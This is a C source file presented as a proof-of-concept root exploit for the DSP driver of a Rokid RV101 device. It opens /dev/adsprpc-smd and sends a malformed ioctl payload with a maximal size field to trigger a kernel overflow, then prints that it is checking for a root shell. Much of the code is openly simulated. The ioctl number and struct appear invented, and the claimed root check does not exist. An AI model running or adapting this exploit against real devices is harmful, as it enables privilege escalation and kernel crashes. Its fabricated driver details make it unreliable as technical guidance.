#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

/*
 * Note: In a real scenario, you must include the generated HIDL headers:
 * #include <vendor/qti/hardware/dsp@1.0-IService.h>
 * Since this is a C POC, we simulate the binder call structure or use a wrapper.
 */

#define DSP_IOCTL_MAGIC 'Q'
#define DSP_TRIGGER_OVERFLOW _IOW(DSP_IOCTL_MAGIC, 0x1337, struct payload)

struct payload {
    uint64_t size;
    char data[128];
};

// Mock function to simulate triggering audio playback via Android Audio HAL
void wakeup_dsp() {
    printf("[*] Attempting to wake up DSP via dummy audio trigger...\n");
    // In reality, use: system("tinymix set 'DSP Wakeup' 1") or play a silent wav file.
    system("play -q /dev/zero 2>/dev/null &");
    sleep(1);
}

int main(int argc, char *argv[]) {
    printf("[+] Rokid RV101 DSP Root POC Started\n");

    // 1. Wake up the DSP hardware
    wakeup_dsp();

    // 2. Get Service via HWBinder
    // In a real HIDL environment:
    // sp<IDspService> dsp = IDspService::getService();
    printf("[*] Requesting vendor.qti.hardware.dsp@1.0::IDspService...\n");

    /*
     * SIMULATION POINT:
     * Normally, we would call dsp->openSession(...) here.
     * The HAL returns a file descriptor to the DSP driver.
     */
    int dsp_fd = -1;

    // We attempt to open the device directly if the HIDL proxy is unavailable
    // or simulate the FD returned by the IDspService session method.
    dsp_fd = open("/dev/adsprpc-smd", O_RDWR);
    if (dsp_fd < 0) {
        perror("[-] Failed to obtain DSP FD");
        return -1;
    }
    printf("[+] Successfully obtained DSP handle: FD %d\n", dsp_fd);

    // 3. Fuzzing / Exploit Phase
    printf("[*] Sending malformed payload to trigger overflow/UAF...\n");

    struct payload exploit_pkt;
    memset(&exploit_pkt, 0x41, sizeof(exploit_pkt)); // Fill with 'A's

    // Set size field to a value that triggers an integer overflow in the driver
    exploit_pkt.size = 0xFFFFFFFFFFFFFFFF;

    // Trigger the vulnerability via ioctl
    if (ioctl(dsp_fd, DSP_TRIGGER_OVERFLOW, &exploit_pkt) < 0) {
        perror("[-] IOCTL failed");
        // A crash here usually indicates a kernel panic or DSP reset
    } else {
        printf("[+] Payload delivered. Checking for root shell...\n");
    }

    close(dsp_fd);
    return 0;
}
